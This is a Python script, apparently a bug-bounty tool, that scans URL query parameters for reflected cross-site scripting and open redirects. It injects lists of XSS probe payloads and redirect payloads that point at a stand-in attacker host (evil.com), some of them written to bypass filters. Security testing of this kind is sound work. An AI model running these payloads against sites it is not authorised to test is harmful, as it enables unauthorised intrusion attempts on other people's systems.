#!/usr/bin/env python3
"""Custom XSS + Open Redirect Scanner for bug bounty hunting.

Scans target URLs for common XSS and open redirect patterns.
"""
import argparse
import re
import sys
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import requests

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<div style=\"background:url(javascript:alert(1))\">",
    "<iframe src=\"javascript:alert(1)\">",
    "<details open ontoggle=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "http://evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://google.com@evil.com",
    "https://evil.com#google.com",
    "https://evil.com?google.com",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}


def extract_params(url: str) -> dict:
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def test_xss(url: str, param: str, payload: str) -> dict:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    try:
        resp = requests.get(test_url, headers=HEADERS, timeout=15, allow_redirects=True)
        reflected = payload in resp.text
        return {
            "url": test_url,
            "param": param,
            "payload": payload,
            "reflected": reflected,
            "status": resp.status_code,
            "length": len(resp.text),
        }
    except Exception as e:
        return {"url": test_url, "error": str(e)}


def test_redirect(url: str, param: str, payload: str) -> dict:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    try:
        resp = requests.get(test_url, headers=HEADERS, timeout=15, allow_redirects=False)
        location = resp.headers.get("Location", "")
        open_redirect = "evil.com" in location or payload in location
        return {
            "url": test_url,
            "param": param,
            "payload": payload,
            "location": location,
            "open_redirect": open_redirect,
            "status": resp.status_code,
        }
    except Exception as e:
        return {"url": test_url, "error": str(e)}


def scan_target(url: str, modes: list[str], max_params: int = 10) -> list[dict]:
    params = extract_params(url)
    if not params:
        print(f"[!] No query parameters found in {url}")
        return []
    param_names = list(params.keys())[:max_params]
    print(f"[*] Scanning {url}")
    print(f"[*] Parameters: {', '.join(param_names)}")
    results = []
    for param in param_names:
        if "xss" in modes:
            for payload in XSS_PAYLOADS:
                result = test_xss(url, param, payload)
                results.append(result)
                if result.get("reflected"):
                    print(f"[POTENTIAL XSS] {param} -> {payload[:40]}")
                time.sleep(0.2)
        if "redirect" in modes:
            for payload in REDIRECT_PAYLOADS:
                result = test_redirect(url, param, payload)
                results.append(result)
                if result.get("open_redirect"):
                    print(f"[POTENTIAL REDIRECT] {param} -> {payload}")
                time.sleep(0.2)
    return results


def main():
    parser = argparse.ArgumentParser(description="Custom XSS + Redirect Scanner")
    parser.add_argument("url", help="Target URL with query parameters")
    parser.add_argument("--mode", nargs="+", default=["xss", "redirect"], choices=["xss", "redirect"])
    parser.add_argument("--max-params", type=int, default=10)
    parser.add_argument("--output", default="reports/scan_results.jsonl")
    args = parser.parse_args()
    results = scan_target(args.url, args.mode, args.max_params)
    hits = [r for r in results if r.get("reflected") or r.get("open_redirect")]
    print(f"\n[*] Scan complete. {len(hits)} potential hits out of {len(results)} tests.")
    if hits:
        print("[!] Review hits manually before reporting!")
    import json
    from pathlib import Path
    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "a", encoding="utf-8") as f:
        for r in results:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print(f"[*] Results saved to {out}")


if __name__ == "__main__":
    main()
